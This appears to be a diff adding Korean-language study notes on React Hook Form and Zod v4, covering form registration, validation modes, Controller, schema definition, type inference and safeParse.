+  - 자동으로 validation 실행
+  - 성공 시 data 전달
+
+  ***
+
+  ## 3. 🧠 동작 흐름 (진짜 중요)
+
+  ```tsx
+  register → 입력값 추적
+          ↓
+  validation 실행
+          ↓
+  handleSubmit → onSubmit(data)
+  ```
+
+  👉 핵심:
+
+  > state 따로 안 만들고 자동 관리됨
+
+  ***
+
+  ## 4. ✅ Validation (폼 검증)
+
+  ```tsx
+  <input
+    {...register('email', {
+      required: '필수값입니다',
+      pattern: {
+        value: /\S+@\S+\.\S+/,
+        message: '이메일 형식 아님',
+      },
+    })}
+  />
+  ```
+
+  에러 출력:
+
+  ```tsx
+  {
+    errors.email?.message;
+  }
+  ```
+
+  👉 특징:
+  - HTML validation 스타일 기반
+  - 간단 + 직관적
+
+  ***
+
+  ## 5. ⚡ 성능이 좋은 이유
+
+  👉 일반 React:
+  - input 값 바뀔 때마다 리렌더
+
+  👉 React Hook Form:
+  - **uncontrolled 방식 사용**
+  - **필요한 부분만 업데이트**
+
+  📌 결과:
+
+  > 리렌더 거의 없음 → 빠름
+
+  ***
+
+  ## 6. 🧩 Controller (중요🔥)
+
+  👉 언제 쓰냐?
+  - input이 **controlled component일 때**
+
+  예:
+  - MUI input
+  - date picker
+  - custom component
+
+  ```tsx
+  <Controller
+    name="message"
+    control={control}
+    render={({ field }) => <textarea {...field} />}
+  />
+  ```
+
+  👉 한 줄 정리:
+
+  > "register 안 되는 컴포넌트 연결용"
+
+  ***
+
+  ## 7. 🏗 주요 옵션들
+
+  ```tsx
+  useForm({
+    defaultValues: {}, // 초기값
+    mode: 'onChange', // validation 타이밍
+  });
+  ```
+
+  ### validation mode
+
+  | 옵션     | 설명             |
+  | -------- | ---------------- |
+  | onSubmit | 제출 시          |
+  | onChange | 입력할 때        |
+  | onBlur   | 포커스 벗어날 때 |
+
+  ***
+
+  ## 8. 🔌 확장 기능 (실무 핵심)
+
+  ### 1) Schema validation (Zod, Yup)
+
+  ```tsx
+  resolver: zodResolver(schema);
+  ```
+
+  👉 장점:
+  - 타입 안정성
+  - 복잡한 validation 처리 가능
+
+  ***
+
+  ### 2) FormProvider
+
+  👉 props drilling 방지
+
+  ```tsx
+  <FormProvider {...methods}>
+  ```
+
+  👉 깊은 컴포넌트에서도 form 접근 가능
+
+  ***
+
+  ## 9. 💡 언제 쓰면 좋냐
+
+  ✔ 이런 경우 무조건 추천:
+  - input 많을 때
+  - validation 많을 때
+  - 성능 중요한 프로젝트
+  - 실무 폼 (로그인, 회원가입, 설문 등)
+
+- **Zod** 학습 내용 정리
+  # 📌 Zod v4 한방 정리
+  ## 1. 📖 Zod가 뭐냐?
+  👉 한 줄 정의:
+  > **"TypeScript 기반 데이터 검증 + 타입 자동 생성 라이브러리"**
+  - 스키마 정의하면 → **검증 + 타입 추론 자동**
+  - 런타임에서도 안전하게 데이터 체크
+  ✔ 특징
+  - 타입 자동 생성 (Type Inference)
+  - 의존성 없음
+  - 가벼움 (~2KB)
+  - Node + 브라우저 둘 다 사용 가능
+  ***
+  ## 2. 🔥 핵심 개념 (이거 3개만 알면 끝)
+  ### 1) Schema 정의
+  ```tsx
+  constUser = z.object({
+    name: z.string(),
+    age: z.number(),
+  });
+  ```
+  👉 "데이터 구조 설계"
+  ***
+  ### 2) parse (검증)
+  ```tsx
+  User.parse(data);
+  ```
+  ✔ 성공 → 타입 안전한 데이터 반환
+  ✔ 실패 → 에러 발생
+  ***
+  ### 3) 타입 자동 생성
+  ```tsx
+  typeUser = z.infer<typeofUser>;
+  ```
+  👉 이게 핵심🔥
+  → 타입 따로 안 만들어도 됨
+  ***
+  ## 3. 🧠 동작 흐름
+  ```
+  Schema 정의 → parse() 실행 → 검증 → 타입 안전 데이터 반환
+  ```
+  👉 핵심:
+  > "타입 + 검증을 한 번에 해결"
+  ***
+  ## 4. ✅ 주요 기능들
+  ### 1) Primitive 타입
+  ```tsx
+  z.string();
+  z.number();
+  z.boolean();
+  z.date();
+  ```
+  ***
+  ### 2) Object / Array
+  ```tsx
+  z.object({ name: z.string() });
+  z.array(z.string());
+  ```
+  ***
+  ### 3) Optional / Nullable
+  ```tsx
+  z.string().optional();
+  z.string().nullable();
+  ```
+  ***
+  ### 4) Union (타입 여러 개)
+  ```tsx
+  z.union([z.string(), z.number()]);
+  ```
+  ***
+  ### 5) Enum
+  ```tsx
+  z.enum(['A', 'B', 'C']);
+  ```
+  ***
+  ## 5. ⚡ Validation (핵심🔥)
+  ```tsx
+  z.string().min(3).max(10);
+  z.number().min(1).max(100);
+  ```
+  👉 chaining 방식
+  ***
+  ## 6. 💣 에러 처리 (v4 핵심 변화)
+  ```tsx
+  z.string({ error: '에러 메시지' });
+  ```
+  ✔ v4 변화:
+  - error 처리 방식 통합됨
+  - 예전처럼 message / errorMap 따로 없음
+  👉 커스텀도 가능
+  ```tsx
+  z.string({
+    error: (iss) => '커스텀 에러',
+  });
+  ```
+  ***
+  ## 7. 🚀 Zod v4 핵심 변화 (중요🔥)
+  ### ⚡ 1) 성능 미친 듯이 개선
+  - 문자열: 최대 14배 빠름
+  - 객체: 최대 6~7배 빠름
+  ***
+  ### 📦 2) 번들 사이즈 감소
+  - 더 가벼워짐
+  - `zod/mini` 추가 (초경량 버전)
+  ***
+  ### 🧩 3) JSON Schema 지원
+  ```tsx
+  schema.toJSONSchema();
+  ```
+  👉 API 문서 / AI / 서버 validation에 활용
+  ***
+  ### 🧠 4) TypeScript 성능 개선
+  - 컴파일 속도 개선
+  ***
+  ### 🆕 5) 새로운 기능들
+  - `z.interface()`
+  - recursive 타입 개선
+  - metadata 시스템
+  - file validation
+  - string → boolean 변환 등
+  ***
+  ## 8. 🧩 Transform & Parse
+  ```tsx
+  z.string().transform((val) => val.toUpperCase());
+  ```
+  👉 데이터 변환까지 가능
+  ***
+  ## 9. 🛡 safeParse (실무 필수)
+  ```tsx
+  constresult = schema.safeParse(data);
+
+  if (!result.success) {
+    console.log(result.error);
+  }
+  ```
+  👉 try/catch 없이 안전 처리
+  ***
+  ## 10. 🔌 React Hook Form이랑 같이 쓰는 이유
+  👉 이 조합이 진짜 실무 핵심
+  ```tsx
+  resolver: zodResolver(schema);
+  ```
+  ✔ 장점:
+  - 타입 + validation 통합
+  - 코드 중복 없음
+  - 유지보수 편함
+  ***
+  ## 11. 💡 언제 쓰냐
+  ✔ 무조건 써야 하는 경우:
+  - API 응답 검증
+  - form validation
+  - env 변수 검증
+  - 서버 input validation
